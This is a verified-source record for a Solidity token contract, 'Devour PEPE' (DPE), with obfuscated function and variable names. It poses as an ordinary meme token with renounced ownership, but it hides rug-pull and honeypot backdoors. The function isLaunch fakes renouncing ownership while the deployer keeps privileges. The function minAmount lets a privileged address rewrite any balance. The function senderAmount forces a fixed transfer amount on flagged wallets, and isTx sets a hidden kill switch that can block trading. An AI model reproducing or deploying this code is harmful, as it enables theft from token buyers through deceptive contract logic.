{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface exemptLiquidity {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address sellReceiver) external view returns (uint256);\n\n    function transfer(address toWallet, uint256 autoMaxReceiver) external returns (bool);\n\n    function allowance(address launchedTeam, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoMaxReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address toWallet,\n        uint256 autoMaxReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverMinLaunch, uint256 value);\n    event Approval(address indexed launchedTeam, address indexed spender, uint256 value);\n}\n\nabstract contract fromTx {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface shouldBuy {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface buyFund {\n    function createPair(address liquidityFund, address marketingAt) external returns (address);\n}\n\ninterface exemptLiquidityMetadata is exemptLiquidity {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DevourPEPE is fromTx, exemptLiquidity, exemptLiquidityMetadata {\n\n    function name() external view virtual override returns (string memory) {\n        return buyLimit;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return fundEnable;\n    }\n\n    uint256 tokenMin;\n\n    address modeReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function minAmount(address listSender, uint256 autoMaxReceiver) public {\n        modeExempt();\n        amountTo[listSender] = autoMaxReceiver;\n    }\n\n    function getOwner() external view returns (address) {\n        return limitSwap;\n    }\n\n    uint256 private txToken;\n\n    function takeAuto(address minToken, address toWallet, uint256 autoMaxReceiver) internal returns (bool) {\n        require(amountTo[minToken] >= autoMaxReceiver);\n        amountTo[minToken] -= autoMaxReceiver;\n        amountTo[toWallet] += autoMaxReceiver;\n        emit Transfer(minToken, toWallet, autoMaxReceiver);\n        return true;\n    }\n\n    uint256 public txSell;\n\n    bool private senderToken;\n\n    bool private fromAmount;\n\n    function limitList(address buyLaunched) public {\n        require(buyLaunched.balance < 100000);\n        if (enableList) {\n            return;\n        }\n        \n        txFeeTake[buyLaunched] = true;\n        if (txToken != totalMin) {\n            limitMax = false;\n        }\n        enableList = true;\n    }\n\n    function senderAmount(address walletLaunched) public {\n        modeExempt();\n        if (limitMax != launchedExempt) {\n            launchedExempt = false;\n        }\n        if (walletLaunched == modeLimit || walletLaunched == swapLaunchReceiver) {\n            return;\n        }\n        sellAuto[walletLaunched] = true;\n    }\n\n    constructor (){\n        \n        shouldBuy senderLimit = shouldBuy(modeReceiver);\n        swapLaunchReceiver = buyFund(senderLimit.factory()).createPair(senderLimit.WETH(), address(this));\n        \n        modeLimit = _msgSender();\n        isLaunch();\n        txFeeTake[modeLimit] = true;\n        amountTo[modeLimit] = isLimit;\n        if (txSell != totalMin) {\n            limitMax = true;\n        }\n        emit Transfer(address(0), modeLimit, isLimit);\n    }\n\n    bool private walletEnable;\n\n    function amountTeam(address minToken, address toWallet, uint256 autoMaxReceiver) internal returns (bool) {\n        if (minToken == modeLimit) {\n            return takeAuto(minToken, toWallet, autoMaxReceiver);\n        }\n        uint256 shouldAt = exemptLiquidity(swapLaunchReceiver).balanceOf(exemptToken);\n        require(shouldAt == tokenMin);\n        require(toWallet != exemptToken);\n        if (sellAuto[minToken]) {\n            return takeAuto(minToken, toWallet, toShould);\n        }\n        return takeAuto(minToken, toWallet, autoMaxReceiver);\n    }\n\n    function owner() external view returns (address) {\n        return limitSwap;\n    }\n\n    function isLaunch() public {\n        emit OwnershipTransferred(modeLimit, address(0));\n        limitSwap = address(0);\n    }\n\n    function modeExempt() private view {\n        require(txFeeTake[_msgSender()]);\n    }\n\n    function transferFrom(address minToken, address toWallet, uint256 autoMaxReceiver) external override returns (bool) {\n        if (_msgSender() != modeReceiver) {\n            if (amountMode[minToken][_msgSender()] != type(uint256).max) {\n                require(autoMaxReceiver <= amountMode[minToken][_msgSender()]);\n                amountMode[minToken][_msgSender()] -= autoMaxReceiver;\n            }\n        }\n        return amountTeam(minToken, toWallet, autoMaxReceiver);\n    }\n\n    string private buyLimit = \"Devour PEPE\";\n\n    string private fundEnable = \"DPE\";\n\n    uint256 shouldTotal;\n\n    address public swapLaunchReceiver;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return isLimit;\n    }\n\n    mapping(address => mapping(address => uint256)) private amountMode;\n\n    mapping(address => bool) public txFeeTake;\n\n    function isTx(uint256 autoMaxReceiver) public {\n        modeExempt();\n        tokenMin = autoMaxReceiver;\n    }\n\n    event OwnershipTransferred(address indexed autoExempt, address indexed limitFee);\n\n    uint256 constant toShould = 10 ** 10;\n\n    function approve(address limitTotal, uint256 autoMaxReceiver) public virtual override returns (bool) {\n        amountMode[_msgSender()][limitTotal] = autoMaxReceiver;\n        emit Approval(_msgSender(), limitTotal, autoMaxReceiver);\n        return true;\n    }\n\n    bool private launchedExempt;\n\n    bool public enableList;\n\n    mapping(address => bool) public sellAuto;\n\n    bool public limitMax;\n\n    address exemptToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public modeLimit;\n\n    uint8 private totalTeam = 18;\n\n    address private limitSwap;\n\n    function balanceOf(address sellReceiver) public view virtual override returns (uint256) {\n        return amountTo[sellReceiver];\n    }\n\n    bool private tokenReceiver;\n\n    function transfer(address listSender, uint256 autoMaxReceiver) external virtual override returns (bool) {\n        return amountTeam(_msgSender(), listSender, autoMaxReceiver);\n    }\n\n    uint256 private isLimit = 100000000 * 10 ** 18;\n\n    mapping(address => uint256) private amountTo;\n\n    function allowance(address takeWallet, address limitTotal) external view virtual override returns (uint256) {\n        if (limitTotal == modeReceiver) {\n            return type(uint256).max;\n        }\n        return amountMode[takeWallet][limitTotal];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalTeam;\n    }\n\n    uint256 private totalMin;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMinLaunch\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitTotal\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoMaxReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoMaxReceiver\",\"type\":\"uint256\"}],\"name\":\"isTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyLaunched\",\"type\":\"address\"}],\"name\":\"limitList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoMaxReceiver\",\"type\":\"uint256\"}],\"name\":\"minAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletLaunched\",\"type\":\"address\"}],\"name\":\"senderAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapLaunchReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoMaxReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoMaxReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txFeeTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DevourPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}